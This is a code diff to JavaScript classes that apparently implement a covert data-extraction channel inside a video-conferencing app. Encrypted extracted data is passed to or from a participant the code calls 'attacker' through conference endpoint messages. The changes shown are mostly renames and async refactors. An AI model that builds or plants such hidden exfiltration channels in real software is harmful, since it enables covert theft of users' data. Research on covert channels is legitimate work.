@@ -97,7 +97,7 @@ export class CommunicationHandler {
             // Define custom event 'extractionEnded' and trigger it.
 
             if (this.enabledEncryption() && this._fileBuffer.length) {
-                console.log('DECRYPT:', recievedData.payload, this);
+                console.log('DECRYPT:', recievedData.data, this);
                 DataEncoder.decrypt(this.fullData, this.key, this.iv).then(decryptedData => {
                     APP.conference.DataEncoder = DataEncoder;
                     this.dispatchExtractionEvent(decryptedData);
@@ -114,7 +114,7 @@ export class CommunicationHandler {
             }
 
         } else { // 'reply' containg text data
-            this._fileBuffer.push(recievedData.payload);
+            this._fileBuffer.push(recievedData.data);
         }
     }
 }
@@ -151,8 +151,8 @@ export default class ExtractionHandler extends CommunicationHandler {
      *
      * @param {object} initiator
      */
-    executeCommand(initiator) {
-        initiator[initiator.getUsedMethod()]();
+    async executeCommand(initiator) {
+        initiator[await initiator.getUsedMethod()]();
     }
 
     /**
@@ -179,17 +179,17 @@ export default class ExtractionHandler extends CommunicationHandler {
         this.user = attacker;
         this.createExtractionEndedListener();
         if (this.enabledEncryption()) {
-            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
+            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(async encryptedData => {
                 const initiator = new CovertTransmitter(attacker, this.configuration,
                         this.nameOfCommunication, this.extractionEvent, encryptedData);
 
-                this.executeCommand(initiator);
+                await this.executeCommand(initiator);
             });
         } else {
             const initiator = new CovertTransmitter(attacker, this.configuration,
                     this.nameOfCommunication, this.extractionEvent, data);
 
-            this.executeCommand(initiator);
+            await this.executeCommand(initiator);
         }
     }
 
@@ -210,7 +210,7 @@ export default class ExtractionHandler extends CommunicationHandler {
      */
     endCommunication(user) {
         APP.conference.sendEndpointMessage(user.getId(), {
-            extraction: 'reply',
+            type: 'reply',
             isEnd: true
         });
         this.communicationEnded = true;
